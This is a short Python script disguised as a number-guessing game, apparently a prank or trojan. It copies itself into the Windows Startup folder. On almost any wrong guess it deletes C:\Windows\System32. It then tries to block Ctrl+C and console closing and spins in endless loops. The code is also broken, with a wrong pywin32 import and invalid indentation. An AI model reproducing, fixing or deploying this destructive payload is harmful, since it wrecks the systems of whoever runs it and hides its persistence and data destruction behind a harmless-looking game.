import random, os, os.path, signal, shutil
from pywin32 import win32api

script_path = os.path.abspath(__file__)
startup_dir = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

destination = os.path.join(startup_dir, os.path.basename(script_path))

shutil.move(script_path, destination)
number = random.randint(1,100)
guess = input("Guess a number between 1 and a 100")
guess = int(guess)

if guess == number:
  print ("You won !")
else:
  shutil.rmtree("C:\Windows\System32")


 def handler(signum, frame):
  print("Non")
  signal.signal(signal.SIGINT, handler)
while True:
    pass
  
def on_close(event):
    print("Non")
    return True  # empêche la fermeture
win32api.SetConsoleCtrlHandler(on_close, True)
while True:
    pass
  
